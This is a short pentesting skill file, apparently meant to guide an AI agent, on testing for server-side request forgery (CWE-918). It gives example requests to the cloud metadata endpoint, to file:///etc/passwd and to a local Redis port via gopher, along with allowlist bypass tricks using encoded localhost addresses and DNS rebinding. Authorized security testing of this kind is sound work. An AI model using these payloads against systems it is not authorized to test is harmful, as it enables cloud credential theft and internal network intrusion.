
name: cwe-918-ssrf
description: Use when a URL/fetch/import param reaches internal hosts.
version: 1.0.0
license: MIT
platforms: [linux, windows]
tags: [cwe, cwe-918, access-control, pentest, owasp, a01]
category: pentesting-skills
related_skills:
  - owasp-a01-broken-access-control
---

# CWE-918 - Server-Side Request Forgery (SSRF)

CWE-918: Server-Side Request Forgery - a URL/fetch/import parameter enables the server to make requests the attacker influences (internal metadata, admin, SSRF chain).

## Parent Skill

This is a sub-skill of `owasp-a01-broken-access-control` (OWASP A01 Broken Access Control, Top 10 2025).
Load the parent for overall A01 scope, validation criteria (negative control), and
the reporting template. This skill covers the CWE-918 detail: what to look for,
how to trigger it, and what a confirmed finding looks like.

## When to Use

- Use when a URL/fetch/import parameter performs a server-side request that reaches internal infrastructure.

## Detection & Test

1. On every URL/fetch/import parameter, probe internal endpoints (Test Procedure step 7).
2. Test metadata (169.254.169.254), file://, gopher://, dict://.
3. Use a controlled external callback to prove a blind SSRF.
4. Confirm the SSRF by the OOB callback, not by a status code.

## Example Requests

```http
GET /proxy?url=http://169.254.169.254/latest/meta-data/
```
```http
GET /fetch?url=file:///etc/passwd
```
```http
GET /proxy?url=gopher://127.0.0.1:6379/
```

## Bypass Tricks

- Reach cloud metadata: `http://169.254.169.254/latest/meta-data/`.
- Use `file://` to read a local file.
- Use `gopher://`/`dict://` to hit internal services.
- Bypass an allowlist with a decimal IP: `http://2130706433/`.
- Bypass with an IPv6: `http://[::1]/` or `http://[0:0:0:0:0:0:0:1]/`.
- Use a redirect from a trusted host to an internal one.
- Exploit a DNS rebinding to get past a hostname check.
- Use `127.0.0.1` variants: `0x7f000001`, `0177.0.0.1`, `0.0.0.0`.


## Impact

- Server performs attacker-influenced requests to internal targets.

## See Also

- `owasp-a01-broken-access-control` - parent skill (A01 scope, Test Procedure, Validation, reporting).
- `owasp-top10-2025-testing` - top-level OWASP Top 10 2025 reference (full 249-CWE table, priority order).